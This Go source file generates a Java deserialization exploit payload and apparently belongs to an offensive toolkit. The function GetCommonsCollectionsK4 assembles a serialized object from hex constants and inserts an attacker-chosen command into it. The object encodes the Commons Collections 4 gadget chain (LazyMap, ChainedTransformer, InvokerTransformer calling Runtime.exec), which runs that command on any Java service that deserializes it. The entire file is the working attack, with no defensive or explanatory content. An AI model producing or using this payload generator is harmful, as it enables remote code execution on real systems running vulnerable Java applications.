package gadget

import "encoding/hex"

const CCK4 = "CommonsCollectionsK4"

func GetCommonsCollectionsK4(cmd string) []byte {
	prefix := "ACED0005737200116A6176612E7574696C2E486173684D61700507DAC1C31660D10300024600" +
		"0A6C6F6164466163746F724900097468726573686F6C6478703F4000000000000C7708000000100000" +
		"0001737200356F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E73342E6B6579" +
		"76616C75652E546965644D6170456E7472798AADD29B39C11FDB0200024C00036B65797400124C6A61" +
		"76612F6C616E672F4F626A6563743B4C00036D617074000F4C6A6176612F7574696C2F4D61703B7870" +
		"740001767372002B6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E73342E6D" +
		"61702E4C617A794D61706EE594829E7910940300014C0007666163746F727974002D4C6F72672F6170" +
		"616368652F636F6D6D6F6E732F636F6C6C656374696F6E73342F5472616E73666F726D65723B787073" +
		"72003B6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E73342E66756E63746F" +
		"72732E436861696E65645472616E73666F726D657230C797EC287A97040200015B000D695472616E73" +
		"666F726D65727374002E5B4C6F72672F6170616368652F636F6D6D6F6E732F636F6C6C656374696F6E" +
		"73342F5472616E73666F726D65723B78707572002E5B4C6F72672E6170616368652E636F6D6D6F6E73" +
		"2E636F6C6C656374696F6E73342E5472616E73666F726D65723B39813AFB08DA3FA502000078700000" +
		"00057372003C6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E73342E66756E" +
		"63746F72732E436F6E7374616E745472616E73666F726D6572587690114102B1940200014C00096943" +
		"6F6E7374616E7471007E00037870767200116A6176612E6C616E672E52756E74696D65000000000000" +
		"000000000078707372003B6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E73" +
		"342E66756E63746F72732E496E766F6B65725472616E73666F726D657287E8FF6B7B7CCE380200035B" +
		"000569417267737400135B4C6A6176612F6C616E672F4F626A6563743B4C000B694D6574686F644E61" +
		"6D657400124C6A6176612F6C616E672F537472696E673B5B000B69506172616D54797065737400125B" +
		"4C6A6176612F6C616E672F436C6173733B7870757200135B4C6A6176612E6C616E672E4F626A656374" +
		"3B90CE589F1073296C02000078700000000274000A67657452756E74696D65757200125B4C6A617661" +
		"2E6C616E672E436C6173733BAB16D7AECBCD5A990200007870000000007400096765744D6574686F64" +
		"7571007E001B00000002767200106A6176612E6C616E672E537472696E67A0F0A4387A3BB342020000" +
		"78707671007E001B7371007E00137571007E001800000002707571007E001800000000740006696E76" +
		"6F6B657571007E001B00000002767200106A6176612E6C616E672E4F626A6563740000000000000000" +
		"00000078707671007E00187371007E0013757200135B4C6A6176612E6C616E672E537472696E673BAD" +
		"D256E7E91D7B47020000787000000001"
	cmdStr := generateCmd(cmd)
	suffix := "740004657865637571007E001B0000000171007E00207371007E000F737200116A6176612E75" +
		"74696C2E48617368536574BA44859596B8B7340300007870770C000000103F40000000000000787371" +
		"007E00003F4000000000000C7708000000100000000078787400017478"
	ser, _ := hex.DecodeString(prefix + cmdStr + suffix)
	return ser
}